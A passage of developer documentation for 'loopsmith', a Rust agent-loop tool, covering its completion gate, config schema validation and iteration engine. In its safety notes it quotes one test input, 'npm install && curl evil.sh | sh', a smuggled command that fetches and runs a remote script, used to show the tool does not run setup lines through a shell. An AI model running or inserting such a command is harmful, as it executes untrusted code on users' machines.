`** all consume `TargetVerdict` for reporting; because `CheckResult` uses the eval viewer's field names, exports need no translation layer.\n- **`to_goal_state(iteration)`** stamps the verdict with the iteration number and `now_ms()` and hands it to `loopsmith-memory` for persistence.\n\nDependencies point one way: the gate reads `loopsmith-core` (the A–J config model, `Detector`, `Validation`, `SuccessScenario`, `Mode`, `CompareOp`, `OVERALL`) and writes `loopsmith-memory` (`GoalState`, `now_ms`). It knows nothing about providers, scheduling, or skills — a provider only ever reaches the gate as an *id string* inside a `Judgment`.\n\n## Contributing\n\n**Adding a detector.** Add the variant in `loopsmith-core`'s `Detector` enum, add the schema entry, then add a `run_detector` arm returning `(bool, String)`. Two obligations: fail when the input is absent, and write an evidence string that says what was checked and what was found, including the concrete values. Evidence strings are the primary debugging surface when a loop refuses to finish.\n\n**Testing.** The unit tests in `src/lib.rs` build configs through `cfg_with`, which splices validation YAML into a minimal config and runs it through `loopsmith_core::parse_str` — so tests exercise real parsing, not hand-built structs. Filesystem tests use `loopsmith_util::testing::temp_dir` (available via the `testing` feature, a dev-dependency only).\n\n**Packaging.** `Cargo.toml` ships only `/src/**/*` and the README. Integration tests read `config/examples/` and `config/loop.schema.json` from the repository root, which no crate tarball can contain; including them would publish tests that cannot pass.\n\n**What not to change without a very good reason.** The single-constructor property of satisfied `GoalState`, the never-satisfied-without-blocking-checks rule, the revocation behavior, and the judge independence refusal. Each has a test named after the property it protects, and each is load-bearing for the claim the project makes about itself.","loop-configuration-schema":"# Loop Configuration Schema\n\n# Loop Configuration Schema\n\nThe A–J model that describes a loopsmith loop: what it knows, what it must achieve, how achievement is checked, and when it is allowed to stop. This module is the single definition of that model, expressed twice and kept in sync:\n\n| Artifact | Role |\n|---|---|\n| `config/loop.schema.json` | JSON Schema (draft 2020-12). Editor completion, external tooling, structural shape. |\n| `runtime/crates/loopsmith-core` | The Rust model (`src/config/`), its parsers (`src/md/`, serde), and the cross-field rules (`src/validate.rs`). |\n\nNothing else in the workspace defines config structure. `loopsmith-core` is the leaf of the dependency graph — every other crate (`-gate`, `-graph`, `-provider`, `-skills`, `-memory`, `-mcp`, and the CLI) reads `LoopConfig` and none of them can be reached from here.\n\n## The load path\n\n```mermaid\nflowchart LR\n  A[path] --> B{is_markdown}\n  B -->|.md / .markdown| C[md::parse_md]\n  B -->|else| D[parse_str]\n  D --> E[serde_yaml] -->|fails| F[serde_json]\n  C --> G[LoopConfig]\n  E --> G\n  F --> G\n  G --> H[validate] --> I[ValidationReport]\n```\n\nFour entry points in `lib.rs`:\n\n- **`load(path)`** — reads the file and dispatches. Markdown is chosen *by extension only*, deliberately: a `.md` config is a different grammar, not a different serialization, so guessing would surface a YAML parse error for a document that was never YAML.\n- **`parse_str(text, origin)`** — YAML first (a JSON superset in practice), strict JSON as fallback. Both error strings survive into `CoreError::Parse`, because a config that fails as both is usually only comprehensible from the pair.\n- **`validate(&cfg)`** — never fails; it returns a `ValidationReport` of `Issue`s, each with a `Severity`, a dotted `field` path (`goals[2].name`), and a message.\n- **`load_validated(path)`** — the composition most callers want: any `Severity::Error` becomes `CoreError::Invalid` carrying `report.render()`.\n\n`ValidationReport::has_errors()` is the gate; `errors()` and `warnings()` are iterators for callers that want to print the two classes separately.\n\n## Two layers of enforcement\n\nThe JSON Schema catches shape. `validate.rs` catches everything the schema cannot express — which is most of what actually breaks loops:\n\n**Schema only** — `additionalProperties: false` everywhere, `minLength`/`minimum` bounds, the `oneOf` discriminated unions for `detector`, `trigger`, and `concurrency`, the `if/then` requiring `threshold` when a success scenario's `mode` is `percentage`, and the `^[^>]+(->[^>]+)+$` pattern on guideline dependency lines.\n\n**Rust only** — every cross-reference: does this validation target a goal that exists, does this node depend on a node that exists, does this `regex_match` artifact have a producer, does this phase graph contain a cycle, do two builders land in the same wave without isolation.\n\n**Both** — `overall` being reserved as a goal name, `no_progress_iterations_randomness < no_progress_iterations`, the required-fields set.\n\nA third layer sits underneath both: `#[serde(deny_unknown_fields)]` on every struct in `src/config/`. Without it a misspelled key is silently dropped and the loop runs with a default the author never chose. Two tests in `config/mod.rs` pin this — `a_misspelled_top_level_section_is_refused_not_ignored` (`stop_gate:` instead of `stop_gates:`) and `a_misspelled_nested_field_is_refused_not_ignored` (`max_iteration:`) — and both assert the error *names the offending key*, since \"unknown field\" without the field is not actionable.\n\n## The sections\n\nOne module per section, so \"where does `stop_gates` live\" has the same answer in the schema, the docs, and the code.\n\n| | Field | Module | Type |\n|---|---|---|---|\n| A | `information` | `info.rs` | `Vec<InfoItem>` — key/value/note, handed to every node |\n| B | `pre_execution` | `work.rs` | `Vec<WorkItem>` — the manual work list |\n| C | `goals` | `goals.rs` | `Vec<Goal>` — required, non-empty |\n| D | `validations` | `validation.rs` | `Vec<Validation>` — required, non-empty |\n| E | `success` | `success.rs` | `Vec<SuccessScenario>` |\n| F | `stop_gates` | `gates.rs` | `StopGates` |\n| G | `schedules` | `triggers.rs` | `Vec<Trigger>` |\n| H | `constraints` | `constraints.rs` | `Constraints` (global + per-node) |\n| I | `execution_guidelines` | `guidelines.rs` | `ExecutionGuidelines` |\n| J | `default_skills` | `default_skills.rs` | `Vec<DefaultSkill>` |\n\nPlus four non-lettered sections that describe execution rather than intent: `graph` (`graph.rs`), `providers` (`providers.rs`), `skills` (`skills.rs`), `context` (`context.rs`).\n\nOnly `name`, `goals`, and `validations` are required. Everything else has a serde default — including `stop_gates`, which is why `max_iterations` is 10 and `no_progress_iterations` is 3 in a config that mentions neither.\n\n> One doc-drift note for contributors: the schema's `title`/`description` and the `lib.rs` crate doc still say \"the A–H model\", while the model has grown sections I and J. The README and `validate.rs` say A–J. The Rust field docs on `LoopConfig` are correct and complete; prefer them.\n\n### B — the load-bearing rule\n\n`check_pre_execution` is the rule the whole design rests on being enforceable:\n\n- `pre_execution` empty → **warning**: \"the corpus rule is to do the task manually first — the manual runs are the spec\".\n- Any step with `done: false` → **error**, listing every undone step: \"Automating before understanding produces fast, confident garbage\".\n\nA config that has not been run by hand once is refused rather than accommodated.\n\n### D — detectors and the independence ladder\n\n`Detector` is an internally tagged enum (`#[serde(tag = \"type\")]`), ordered by how much the verdict depends on a model:\n\n```rust\nScript { command, args, expect_exit }   // exit code decides — the strongest\nFileExists { path, non_empty }\nRegexMatch { artifact, pattern }\nThreshold { metric, op: CompareOp, value }\nJudge { standard, min_score }           // a model verdict — rung 3\n```\n\n`CompareOp::apply` implements the five comparisons; note that `Eq` uses `(lhs - rhs).abs() < f64::EPSILON`, which is effectively exact equality for any magnitude above 1 — fine for counts, a trap for scaled floats.\n\nThe `Judge` variant requires a non-empty `standard`, checked in `check_validations` and enforced separately by `loopsmith-gate`. The reasoning is in the field doc: *an unnamed standard is an opinion*. A blocking `Judge` in `Mode::Objective` draws a warning steering the author toward a `script` detector.\n\n**Artifact resolution.** `available_artifacts` builds the set of names a `regex_match` may refer to, and that set comes entirely from this config's own `file_exists` detectors — each registered under both its full `path` and its `file_stem`. A regex naming anything else has nothing to match and fails closed for the life of the loop, which reads to the operator as \"the work is not done\" rather than \"this check was never wired up\". So it is an **error**, and the message lists what *is* available. `a_regex_over_a_file_the_config_declares_is_accepted` pins both spellings resolving.\n\n**Coverage.** Every goal must be the `target` of at least one `blocking: true` validation, or the config is rejected: *a goal you cannot check is a goal the loop can never honestly finish*. A missing `overall` validation is only a warning — the loop can still finish per-goal.\n\n### F — stop gates\n\nSix ceilings, all evaluated every iteration, any one halting the run. `check_stop_gates` adds the rules the schema can't:\n\n- `max_iterations > 100` → warning; a loop that cannot converge in 100 iterations usually has a miscalibrated verifier.\n- `no_progress_iterations == 0` → warning; staleness detection is off.\n- No `max_tokens`, `max_cost_usd`, or `max_wall_clock_seconds` at all → warning: \"an unsolvable task will bill until someone notices\".\n- `no_progress_iterations_randomness` must be `>= 1`, must not be set when `no_progress_iterations` is 0 (staleness is never counted, so it can never fire), and must be **strictly less than** `no_progress_iterations`. At or past the halt point the loop stops before it ever tries something different, and the author would never learn that the setting was inert — so it is an error, not a warning.\n\n### I — execution guidelines vs. graph edges\n\nThese are the two orderings, and keeping them apart is the point of section I existing.\n\n`graph.nodes[].depends_on` means **this node reads that node's output** — a data dependency, nothing else. Overloading it with method-ordering (\"gather before you draft\") would make the critical path meaningless, because half the edges would not be real work dependencies.\n\nPhases carry the method ordering. A `Guideline` is a named phase with a standing instruction injected into every node that declares `stage: <name>`. Ordering is written as arrows:\n\n```yaml\nexecution_guidelines:\n  items:\n    - name: gather\n      guideline: Collect sources. Write nothing yet.\n    - name: draft\n      guideline: Write only from what `gather` collected.\n  dependency:\n    - gather -> draft -> review\n```\n\n`parse_chain` turns `a -> b -> c` into `[(a,b), (b,c)]`. It refuses a line with no arrow (\"write it as `earlier -> later`\") and a dangling arrow (\"empty name at position N\"), reporting the offending *line* rather than the offending character, because that is what the author is looking at. `ExecutionGuidelines::edges()` collects across all lines; `phases()` resolves them into `Phase { name, guideline, depends_on }` — deliberately without cycle or name checking, which belongs to the validator and to `loopsmith-graph`.\n\nTwo guidelines with no arrow between them run in parallel. That is the default on purpose: sequencing should be something you asked for, not something you got by writing one item after another.\n\n`check_execution_guidelines` then rejects duplicate names, arrows naming unknown guidelines, self-arrows, a non-empty `dependency` over an empty `items`, cycles, and — importantly — any `graph.nodes[].stage` that is not a declared guideline, since such a node would silently never be dispatched.\n\n## Two graph algorithms that live here by necessity\n\n`loopsmith-graph` owns the real scheduler, but the dependency runs the other way: core cannot reach it. So `validate.rs` carries two small standalone passes.\n\n**`topo_order(&[Phase])`** — Kahn's algorithm over phase names, used purely to detect cycles. Unknown dependency names are skipped (already reported separately); if fewer nodes are placed than exist, the remaining ones are named in the error.\n\n**`wave_levels(&[NodeSpec])`** — the wave a node lands in, defined as the *longest* dependency chain ending at it, computed by relaxation bounded by the node count. Nodes sharing a wave have no path between them, so they are exactly the set that can be dispatched simultaneously. This exists to make the parallel-writer warning precise:\n\n```\nsurvey            wave 1\n├─ refactor-a     wave 2  ← both unisolated builders, same wave: warned\n└─ refactor-b     wave 2\n```\n\nwhereas `draft -> make-media -> publish` is a straight chain and draws nothing, because *warning about builders that can never overlap trains the reader to ignore the warning that matters*. The warning is also skipped entirely under `Concurrency::Sequential`. A cyclic graph makes the relaxation stop improving rather than spin — `a_cycle_does_not_hang_the_wave_computation` pins that; the cycle itself is reported at plan time.\n\n## Provider routing\n\nEvery `ProviderSpec` is a command template. `{prompt}`, `{system}`, `{model}`, `{tier}`, and `{node}` are substituted into `args` before spawn, which keeps BYOK support out of the Rust build entirely — anything invokable from a shell is routable. `requires_env` names keys only; values are never read, substituted, or logged, so credentials stay out of the ledger.\n\n`ProviderKind` accepts the spellings people actually write. `claude`, `claude-code`, `claudecode` all resolve to `ClaudeCode`; `openai`, `open_ai`, `open-ai`, `OpenAI` to `OpenAi`; `custom` and `BYOK` to `Byok`. `provider_kind_aliases_still_resolve` guards this specifically because the section split could have dropped the aliases silently.\n\n`LoopConfig::cascade_for(tier)` resolves a `Tier` to the ordered provider list: the explicit `providers.cascade` entry if present, otherwise every provider whose `tiers` is empty or contains that tier. `LoopConfig::provider(id)` is the by-id lookup used throughout validation and by `loopsmith-provider::dispatch`.\n\n`check_providers` warns when none are declared (nodes cannot be dispatched), errors on duplicate ids, empty commands, cascade tiers outside `cheap|standard|strong`, and cascade entries naming unknown providers. If `enforce_judge_independence` is on but only one provider exists, it warns — judges will fall back to detector-only verdicts.\n\n## Safety surfaces in section J\n\n`DefaultSkill::init_argv()` splits `init_command` on whitespace and nothing more. This is an **argv line, not a shell line**: `&&`, `|`, and `$(…)` survive as literal arguments. `an_init_command_is_argv_not_a_shell_line` asserts that `npm install && curl evil.sh | sh` yields `argv[0] == \"npm\"` with `&&` as a plain string. A config that could smuggle a shell into a setup step would make a loop directory an unreviewable install script.\n\n`is_safe_repo_url` gates `source: github` clones to `https://` only. `git://` and `ssh://` carry no transport authentication a loop could verify, `file://` would let a config reach anywhere on the machine, and `https://-…` would be read by git as a flag rather than a URL.\n\n## Constraint merging\n\n`ConstraintSet::merged(global, node)` composes section H: list fields (`rules`, `forbidden_paths`, `forbidden_commands`, `human_checkpoint`) **append**, scalar limits (`max_tokens`, `max_seconds`) are **overridden** where the node sets them. `frozen_git_rules()` returns the three-rule set that made large parallel runs survivable, emitted into parallel nodes unless the author opts out.\n\n`human_checkpoint` is the one constraint that ignores permission grants: matching actions stop and wait regardless. Irreversible decisions do not get made at machine speed.\n\n## Consumers\n\nEverything downstream enters through `load` or `load_validated`:\n\n- `loopsmith-cli` — `cmd/plan.rs`, `cmd/schedule.rs`, `cmd/prune.rs`, `cmd/permissions.rs`, `cmd/gate.rs` call `load`; `cmd/run.rs` (via `start`) and `cmd/watch.rs` call `load_validated`, so a run refuses an invalid config while inspection commands do not.\n- `loopsmith-mcp` — `tool_gate` loads the config to answer gate queries.\n- `src/web/assemble.rs::load_file` — the browser-based guided flow.\n- `src/guided/sections.rs` — constructs `InfoItem`, `Goal`, `NodeSpec`, `ProviderSpec`, `StopGates`, `Guideline`, `ConstraintSet`, `DefaultSkill` directly from answers; `src/guided/mod.rs::skeleton` assembles the `LoopConfig`.\n- `loopsmith-cli/src/scaffold.rs::starter_config` — builds a `LoopConfig` from `ProviderRouting`, `SkillPolicy`, and `frozen_git_rules()`, then round-trips it back through `load` in a test, so the scaffold can never emit something the parser rejects.\n- `loopsmith-provider::dispatch` → `LoopConfig::provider`; `src/run/perturb.rs::ask_agent` → `cascade_for` (the cheap-tier call behind `no_progress_iterations_randomness`); `loopsmith-skills::install_default` → `init_argv`; `loopsmith-graph` consumes `GraphSpec` for scheduling and its own concurrency capping.\n\n## Contributing: adding a field\n\nA new field touches five places, and skipping any one produces a config that parses but does not behave:\n\n1. **`config/loop.schema.json`** — the property, its constraints, and a description that says *why*, not just what.\n2. **The section struct** in `src/config/`, with `#[serde(default = \"…\")]` if optional. `deny_unknown_fields` is already on every struct; a new field with no schema entry will parse in Rust and fail schema validation, and vice versa.\n3. **`src/validate.rs`** — any cross-field rule. Ask what a plausible typo produces: if it silently does nothing (a stage naming a phase that doesn't exist, a randomness threshold past the halt point), it is an **error**; if it is a defensible-but-risky choice (no budget ceiling, no judge node), it is a **warning**.\n4. **`src/md/`** — the Markdown grammar, if the field should be authorable there. `loopsmith-core/tests/md_roundtrip.rs` and `loopsmith-cli/tests/surface.rs` assert a config survives the trip out to Markdown and back.\n5. **A test** — the existing suite in `validate.rs` is the template. Each test asserts not just that validation failed but that the message *says why* (`contains(\"can never match\")`, `contains(\"must be less than no_progress_iterations\")`), because a rejection the author cannot act on is barely better than a silent default.\n\nNote the crate's `include` list is `[\"/src/**/*\", \"/README.md\"]`. The integration tests read `config/examples/` and `config/loop.schema.json` from the repository root, which no crate tarball can contain — shipping them would hand a published crate tests that cannot pass. Run them from the workspace root.","loop-execution-engine":"# Loop Execution Engine\n\n# Loop Execution Engine\n\n`runtime/crates/loopsmith-cli/src/run/`\n\nThe iteration loop is the part of loopsmith that actually spends money. It takes a validated `LoopConfig`, schedules its node graph into waves, dispatches those waves to providers, collects evidence from disk, asks the gate what is satisfied, and then asks a mechanical ladder of stop gates whether it may go round again.\n\n`mod.rs` is the state machine and nothing else. Everything it needs is delegated to a neighbour module, and the split is by *authority* rather than by convenience — the thing that decides whether work is finished is never the thing that did the work.\n\n| Module | Owns |\n|---|---|\n| `mod.rs` | `execute()`: the iteration state machine, budget accounting, checkpointing |\n| `dispatch.rs` | `run_node()`: isolation, skill resolution, the provider call — store-free by design |\n| `prompts.rs` | What a node is told: system prompt, task prompt, the bar it will be checked against |\n| `phases.rs` | Section I at runtime: which phase is open, which nodes that lets run |\n| `stop.rs` | `should_stop()`: the stop-gate ladder, as a pure function |\n| `summary.rs` | Compressing an iteration to what the next one needs to know |\n| `perturb.rs` | Varying the approach when the loop has stalled |\n| `evolve.rs` | Judge harvesting, skill trials, config proposals |\n| `publish.rs` | Moving isolated work back where the gate can see it |\n| `export.rs` | The success package a converged run leaves behind |\n\n## Entry point\n\n```rust\npub fn execute<S: Store>(\n    cfg: &LoopConfig,\n    store: &S,\n    opts: &RunOptions,\n) -> Result<RunOutcome, String>\n```\n\n`RunOptions` carries the run identity and the four switches that change what a run is allowed to do: `dry_run` (plan and report, invoke nothing), `resume` (continue from a stored `Checkpoint`), `acquire_skills` (install missing sub-agents rather than running without them), and `verbose` (mirror the run log to stderr). `config_file` exists only so the scripts written into a success export name the right file.\n\n`RunOutcome` reports the stop reason, the gate's final verdicts, spend (`tokens_used`, `tokens_estimated`, `cost_usd`), the number of config proposals written, and two optional paths — the plain-text run log, and the success export, which is `Some` only when the gate certified overall success.\n\nThree commands construct `RunOptions` and call in: `cmd/run.rs`, `cmd/resume.rs`, and `cmd/watch.rs`. `cmd/run.rs::exit_code` and `cmd/mod.rs::report_outcome` both branch on `StopReason::is_success()`. `cmd/gate.rs` reuses `collect_evidence` directly to evaluate a workspace without running anything.\n\n## Before the first iteration\n\nTwo things are resolved up front, because discovering them after a provider call means paying for the discovery:\n\n1. `loopsmith_graph::plan(&cfg.graph)` — the wave schedule, the chosen concurrency, and the predicted speedup. An unschedulable node graph fails here.\n2. `Phases::new(cfg)` — the phase graph. It reuses `loopsmith_graph::waves` purely for its cycle and unknown-name checks; a cyclic `execution_guidelines.dependency` refuses to start.\n\nThen a `Recorder` is opened over the store and a `RunLog`. Every event from that point goes to both through one call, which is why `a_run_writes_a_readable_log_beside_the_config` can assert the log's line count equals the ledger's length — the queryable record and the readable one cannot disagree.\n\nIf `acquire_skills` is on and this is not a dry run, `install_default_skills` installs section J's declared sub-agents. A failure is recorded as `LedgerKind::NodeFailed` and the run continues: a loop whose optional helper could not be fetched is degraded, not broken.\n\nResume restores more than the iteration counter. `checkpoint.revisions`, `stale_iterations`, `last_signature`, and (via `restore_verdicts`) the previous rulings all come back, so a resumed run cannot be handed a fresh no-progress counter every time it pauses. Unparseable stored verdicts are dropped rather than guessed at — reporting no deltas on the first iteration is a small loss; reporting invented ones is not.\n\n## One iteration\n\n```mermaid\nflowchart TD\n    A[read scratchpads + carry_forward] --> B{stalled?}\n    B -- yes --> C[perturb::choose]\n    B -- no --> D\n    C --> D[for each wave: chunk, filter, dispatch in threads]\n    D --> E[join, then write ledger + episodes + publish]\n    E --> F[evolve::harvest_judgments]\n    F --> G[collect_evidence → gate::evaluate_all]\n    G --> H[phases.refresh · summary · revisions · trials]\n    H --> I{should_stop}\n    I -- None --> J[save checkpoint] --> A\n    I -- Some --> K[break with reason + verdicts]\n```\n\n### Context assembled once\n\nScratchpad notes (written by the MCP scratchpad tool, one per goal) and `summary::carry_forward` are read once per iteration and shared by reference with every node. A worker thread never touches the store mid-dispatch, and every node in the iteration sees the same account of what happened.\n\n### Perturbation\n\nWhen `gates.no_progress_iterations_randomness` is set and `stale_iterations` has reached it, `perturb::choose` picks a variation from a deterministic seed (`perturb::seed_for(run_id, iteration)`), given the current stall: how long it has been stuck, which blocking checks are failing (`failing_checks`), and the last two summaries. The seed is written into the ledger so the run replays.\n\nThe chosen `Perturbation` reaches nodes two ways: `p.directive()` is appended to the task prompt, and `p.tier_for(node.tier)` may escalate the node one tier stronger. **Neither reaches a judge.** Telling the thing that checks the work to try a different approach — or running it on a stronger model at the same moment as the work — is how a stalled loop talks itself into a lower bar.\n\n`Perturbation::Explore` is the one case where trying an untried sub-agent happens without being asked for; `Perturbation::Reorder` shuffles nodes within a wave before chunking.\n\n### Dispatch\n\nNodes inside a wave are independent by construction, so the only ordering that matters is between waves. Each wave is chunked by `plan.concurrency.max(1)` and each chunk runs under `std::thread::scope`. A node is dropped from the chunk if:\n\n- `phases.eligible(n)` is false — silently, because a node waiting on its phase is the normal state and one line per node per iteration would bury the events that matter; or\n- it has spent `gates.max_revisions_per_node` revisions — logged, with the reason, so the ledger says why it stopped being dispatched.\n\nEverything that touches the store happens outside the threads. `ensure_skills` runs before the spawn; the `published_paths` map is *cloned* per chunk rather than borrowed, so every node in one chunk sees the same published set — which is also the honest answer, since they ran at the same time.\n\n`run_node` is pure with respect to the store. It creates isolation, seeds the worktree, merges the constraint set, builds both prompts, and calls `loopsmith_provider::dispatch`. Both the success and error paths return a `NodeOutcome`; a provider failure is a populated `error` field, not a panic or a lost node. `isolation` is carried out structurally rather than as prose because the caller has to publish from it, and cannot do that from a description.\n\nWrites happen after the join, in a defined order: ledger entry, budget accumulation into the checkpoint, `store.put_episode`, then publication.\n\n### Isolation and publication\n\nAn isolated node runs in `state/worktrees/<node>/`. Evidence is collected from the loop root and nowhere else, so isolation is a property of the **wave**, not of the run:\n\n```mermaid\nflowchart LR\n    R[loop root] -- seed --> W1[worktree A]\n    R -- seed --> W2[worktree B]\n    W1 -- publish --> R\n    W2 -- publish --> R\n    R --> G[gate collects evidence]\n```\n\n`publish::publish` copies only what `git status --porcelain -z --untracked-files=all` reports as differing from the commit the worktree branched from. Two rules make it safe to reason about:\n\n- **Only what the node changed is published.** Copying the whole tree would republish the repository over itself.\n- **The first writer of a path wins; the second is reported.** `claimed_paths` is scoped to the iteration, so a node rewriting its own output next iteration is not a collision. The loser is named in the ledger with the path and the node that got there first, and the entry is recorded as `NodeFailed`.\n\nPaths under `state/`, `logs/`, and `.git/` are reserved and never cross the boundary. Deletions are not propagated — that is a different decision from propagating a write.\n\n`publish::seed` is the mirror image. A worktree branches from `HEAD`, so it would otherwise be blind to everything the run has produced since, including its own upstream's output. `published_paths` is carried across iterations for exactly this; a node is never seeded with a path it published itself, since a builder's in-progress work must not be overwritten by last iteration's copy of it.\n\n### Evidence and the gate\n\n```rust\npub fn collect_evidence(\n    cfg: &LoopConfig,\n    workdir: &Path,\n    metrics_file: Option<&Path>,\n    judgments: Vec<Judgment>,\n) -> Evidence\n```\n\nDeliberately narrow: **a node's own claim that it finished is not evidence.** Only three things count — `metrics.json` parsed as `BTreeMap<String, f64>`, artifacts read from disk, and judge verdicts parsed by `evolve::harvest_judgments`.\n\nArtifacts are the files the config's own `file_exists` detectors name (`artifact_paths`), registered under both their full path and their file stem. Without that, a `regex_match` detector has nothing to match against and reports \"artifact was not collected\" forever — a check that looks like rigour while being permanently unsatisfiable.\n\nThe gate itself is `loopsmith_gate::evaluate_all`, and it is the **only** writer of goal state. That is enforced structurally: `nothing_that_perturbs_or_summarises_can_reach_goal_state` reads `perturb.rs` and `summary.rs` as text and asserts neither mentions `set_goal_state`, `to_goal_state`, or `GoalState`. Both of those take a model's output as input, so the test asserts they have no path to the one function that could hand a model the verdict.\n\nJudge verdicts are only worth reading once you know which provider produced the work being judged — that comes from the episode record, not from the judge's own claim. `a_judge_on_the_builders_provider_still_cannot_satisfy_the_gate` pins this: same provider for builder and judge, and the verdict does not count.\n\n### Phases\n\nA phase is **active** when every phase it depends on is complete, and **complete** when all its member nodes have run and every goal they advance is satisfied *according to the gate*. `Phases::refresh(&verdicts, &dispatched)` is called after every ruling and returns the phases that closed on that pass, so the ledger can say so.\n\nTwo deliberate escape hatches: a node with no `stage` is never gated (adding section I must not be a breaking change for configs that don't use it), and a phase with no nodes is complete on sight (`mark_vacuous_complete`) so it never blocks the phase behind it. A stage nobody declared fails closed — validation refuses it, and at runtime `is_active` returns false rather than running work the author did not order.\n\n`guideline_for` supplies the phase's standing instruction, which `build_node_prompt` places *before* the goals: it is usually about what not to do yet.\n\n### Summaries\n\n`summary::deterministic` is written by Rust from the gate's verdicts and the episode record. It is always present, costs nothing, and cannot be wrong about what was satisfied. It reports what ran, what changed since last iteration (`Newly satisfied:` / `REVOKED —`), each still-failing blocking check with the gate's own evidence line, phases closed, and spend to date.\n\n`summary::add_narrative` is optional prose from `cfg.context.summary_provider`, dispatched at `Tier::Cheap`. It is allowed to be interesting and never allowed to matter: the summariser is told explicitly that a separate deterministic gate decides completion and its text has no effect on it. A failed or slow summariser must not fail the iteration it describes, so the whole thing is best-effort.\n\n`carry_forward` renders the last `cfg.context.carry_summaries` summaries into the next iteration's prompt. This is the entire cost-control story — prompt size stops growing with the run. Before it existed, every iteration sent a byte-identical prompt, which is why a stalled loop kept re-running the approach that had already failed; `each_iteration_is_summarised_and_the_next_one_reads_it` proves it no longer does by asserting the `prompt_digest` differs between iterations 1 and 2. Setting `carry_summaries: 0` switches it off and the digests become identical again — summaries are still recorded, they just aren't carried.\n\n### Revisions\n\n`max_revisions_per_node` bounds how many times a node may be re-run with its goals still unsatisfied, so one stuck node cannot spend the whole iteration budget. The counter measures **failed** revisions only:\n\n- nodes with no declared goals are never counted — there is nothing to measure them against, so capping them would be arbitrary;\n- a node whose goals the gate satisfied is never capped, however long the run (`a_node_whose_goals_are_satisfied_is_never_capped`).\n\nNodes that spend their last revision land in `exhausted_nodes`, which `evolve::write_proposals` reads — at that point the graph is questioned rather than the node re-run forever.\n\n## Stop gates\n\n`stop.rs` is a pure function over a snapshot. It touches no store, no provider, and no clock; it is handed numbers and returns a verdict. It runs **after** the gate ruling, so no amount of confident output from a node can extend a run past its ceiling.\n\n```rust\npub fn should_stop(inp: &StopInputs) -> Option<StopReason>  // None means keep going\n```\n\nOrder is not arbitrary. Success is checked first, so a run that meets the bar on its last permitted iteration reports `OverallSuccess` rather than `IterationCap`. After that it is budgets, cheapest signal first:\n\n| Order | `StopReason` | Fires when |\n|---|---|---|\n| 1 | `OverallSuccess` | `stop_on_overall_success` and `loopsmith_gate::overall_success` |\n| 2 | `NoProgress(n)` | `no_progress_iterations > 0` and `stale_iterations >= it` |\n| 3 | `IterationCap(n)` | `iteration >= max_iterations` |\n| 4 | `WallClock(s)` | `max_wall_clock_seconds` reached |\n| 5 | `TokenBudget(t)` | `max_tokens` reached |\n| 6 | `CostBudget(s)` | `max_cost_usd` reached |\n\n`0` means *disabled* for the no-progress gate, not *instant* — pinned by `zero_disables_the_no_progress_gate`.\n\nProgress is measured by `progress_signature`, a sorted fingerprint of `target:satisfied:passed/total` across all verdicts. Unchanged signature increments `stale_iterations`; any change resets it to zero. This is what perturbation reacts to, and perturbation only delays giving up — `a_stalled_run_varies_its_approach_before_it_gives_up` asserts the run still halts with `NoProgress(3)`.\n\nThe loop breaks with `(reason, verdicts)` together. Carrying them out as a pair is what removed the older two-variable dance where each of six break sites had to remember to copy `current` into an outer `verdicts` first.\n\n## The success export\n\nWritten only when `stop.is_success()`, which is true only for `StopReason::OverallSuccess`, which only `should_stop` produces, and only from `loopsmith_gate::overall_success`. There is no flag that writes it anyway — an export a confident model could produce would be a certificate that means nothing.\n\n`export::export_success` writes `<root>/<sanitized-name>-success/`:\n\n- `SKILL.md` — frontmatter making the package a reusable sub-agent skill, what it proved, how to reuse it, and a \"this is a record, not a guarantee\" section;\n- `EVIDENCE.md` — final rulings with per-check evidence lines, plus the iteration history, stating up front that no node's own claim appears in it;\n- `loop.yaml` — the config that converged, verbatim, because someone reusing it needs the thing that worked rather than a description of it;\n- `out/` — whatever the nodes produced, copied via `copy_tree`;\n- `run.sh` and `run.cmd` — POSIX `sh` (macOS ships bash 3.2) and CRLF batch launchers. Both find `loopsmith` on `PATH` rather than pinning a path that only existed on the producing machine. `run.cmd` has exactly one `exit /b`, on the last line: an early `exit /b` under `setlocal` reports 0, because the implicit `endlocal` restores the saved errorlevel.\n\n`sanitize` maps anything outside `[A-Za-z0-9_-]` to `-`, so a loop named `demo/loop` cannot put its export in a subdirectory and `../../etc` cannot escape at all.\n\n## Crate boundaries\n\n```\nloopsmith-cli::run\n   ├─ loopsmith-core      LoopConfig, NodeSpec, Role, Tier, Detector, ConstraintSet, Phase\n   ├─ loopsmith-graph     plan(), waves() — wave schedule + cycle checks\n   ├─ loopsmith-gate      evaluate_all(), overall_success(), Evidence, TargetVerdict, Judgment\n   ├─ loopsmith-memory    Store, Checkpoint, Episode, IterationSummary, LedgerKind\n   ├─ loopsmith-provider  dispatch(), InvokeRequest, digest()\n   ├─ loopsmith-skills    install_default(), find_installed(), acquire()\n   └─ crate::{logging, worktree, judgment}\n```\n\nThe gate crate depends on the memory crate and not the reverse, which is why `Checkpoint` stores verdicts as `verdicts_json: Option<String>` and `restore_verdicts` has to parse them back.\n\n## Contributing\n\n**Adding a stop gate.** Add a `StopReason` variant with a `describe()` arm, add its input to `StopInputs` if it isn't already there, and place the check in `should_stop` by cost — success stays first. `execute()` needs no change; it breaks on whatever `should_stop` returns.\n\n**Adding an evidence source.** Extend `collect_evidence`. If it needs new files, extend `artifact_paths` so the config still declares what the loop produces. Never let a node's own output become evidence.\n\n**Anything that reads model output.** Keep it away from goal state. `nothing_that_perturbs_or_summarises_can_reach_goal_state` will fail if a new file in that class starts referencing `set_goal_state`, `to_goal_state`, or `GoalState` — extend that test's file list rather than working around it.\n\n**Anything that runs on a worker thread.** Keep it store-free, like `run_node`. Return what you learned on `NodeOutcome` and let the caller write it down after the join, so the ledger stays ordered.\n\n**Testing.** `mod.rs`'s tests drive real `execute()` runs against a `SledStore` in a temp dir, using `byok` providers backed by `echo` and `printf` — cheap, deterministic, and enough to exercise budgets, resume, revisions, exports, and judge wiring. `sleeper_provider()` is the pattern for timing assertions: it returns a platform-appropriate delay command (`ping -n` on Windows, `sleep` elsewhere) because a spawn that fails instantly measures nothing and trips the wall-clock assertion for reasons unrelated to concurrency.","markdown-yaml-config-interchange":"# Markdown/YAML Config Interchange\n\n# Markdown/YAML Config Interchange\n\n`loopsmith-core::md` lets a loop config be written as a Markdown document instead of YAML, and converts back the other way. Both grammars describe the same `LoopConfig` — the A–J section model — so nothing about the config model lives in this module beyond one small lookup table.\n\nThe point of the Markdown form is co-located documentation: prose at the left margin is ignored by the parser, so the reason a goal exists can sit directly next to the goal.\n\n## Public surface\n\n| Item | Location | Signature |\n|---|---|---|\n| `parse_md` | `md/parse.rs` | `fn(text: &str, origin: &str) -> Result<LoopConfig, 